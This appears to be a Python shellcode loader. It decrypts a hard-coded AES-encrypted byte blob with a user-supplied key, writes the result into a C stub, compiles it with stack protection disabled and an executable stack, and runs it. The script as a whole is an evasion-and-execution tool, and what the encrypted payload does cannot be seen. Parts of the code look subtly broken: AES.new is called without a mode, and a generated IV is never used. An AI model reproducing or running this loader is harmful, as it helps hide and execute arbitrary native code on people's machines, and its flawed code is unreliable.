#!/usr/bin/env python3

from Crypto.Cipher import *
import hashlib
import random
from ctypes import *
import os

shellcode = b"\x17\xec\x68\x22\x99\xe1\xd4\x2b\x92\xca\x3e\xe5\x92\xa2\x14\x6c\xf3\xda\x20\xec\xec\x21\xa8\x9b\xd6\xce\x10\x36\x11\x25\xee\x8d\x15\x63\xa9\xe5\x2b\x5c\x69\x9f\x52\x74\x04\x4a\x92\xcb\x36\x5d\x08\x2f\x45\x06\xc6\xab\x55\x0b\x50\x2e\x99\x95\xb2\xf1\x6c\x0f\x21\xbf\x04\x27\x6d\xff\x7e\xa4\x21\x14\x43\xda\xff\x2e\x49\x84\xe8\xb4\x1a\xf5\xeb\x5b\x17\xe6\x03\x24\x59\x08\x31\x29\x47\x71\x53\x73\x30\xe8\x83\x72\x05\x08\x02\xa0\xaf\xf1\xae\xf1\xb8\xb5"

def md5_key(key):
    c = str.encode(key)
    hashed = hashlib.md5(c)
    return hashed.hexdigest()

def format_shellcode(shellcode):
    res = ""
    for x in shellcode:
        res += "\\x%02x" % x
    return res

def unpad(shellcode):
    shellcode = format_shellcode(shellcode)
    return shellcode.replace("\\x2a",'')

def execute(shellcode):
    file = open("9636.c","w")
    file.write('''
        #include <stdio.h>

        int main(void){
            unsigned char code[] = \"''' + shellcode + '''";

            int (*ret)() = (int(*)())code;
            ret();
            return 0;
        }
    ''')
    file.close()
    os.system("gcc -fno-stack-protector -z execstack -o 9636 9636.c")
    os.system("./9636")
    os.system("rm 9636.c 9636")
    
    
key = input("Enter decryption key : ")
key = md5_key(key)
iv = ''.join([chr(random.randint(0,255)) for i in range(16)])
cipher = AES.new(key)
decrypted = cipher.decrypt(shellcode)
shellcode = unpad(decrypted)

print("[+] Decrypted shellcode : \n{}\n".format(shellcode))
print("[+] Key used to decrypt ( MD5 ) : \n{}\n".format(key))

execute(shellcode)
